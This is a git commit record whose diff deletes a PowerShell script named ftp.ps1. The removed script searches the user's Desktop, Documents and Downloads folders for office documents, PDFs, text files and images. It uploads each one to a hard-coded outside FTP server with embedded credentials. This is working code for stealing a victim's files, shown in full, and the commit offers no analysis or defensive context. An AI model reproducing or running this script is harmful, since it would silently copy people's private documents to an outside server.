ed353fc42c861c4d49a3b3768fe8915e6d8f103d
louist12 <114141279+louist12@users.noreply.github.com>
2022-10-03 02:29:15 -0700

    Delete ftp.ps1

--- ftp.ps1
+++
@@ -1,8 +0,0 @@
-﻿$src =  "C:\Users\$env:username\desktop","C:\Users\$env:username\Documents","C:\Users\$env:username\Downloads"
-#copy files to one folder
-foreach($file in Get-ChildItem -path $src -Include *.txt,*.xlsx,*.pdf,*.ppt,*.docx,*.jpeg,*.jpg -Recurse){    
-    
-    $uploadFile=$file.FullName; $ftp='ftp://testadmin:testpassword@192.119.71.89/$file.Name'; $client=New-Object -TypeName System.Net.WebClient; $URI=New-Object -TypeName System.Uri -ArgumentList $ftp; $client.UploadFile($URI,$uploadFile)
-}
-
-
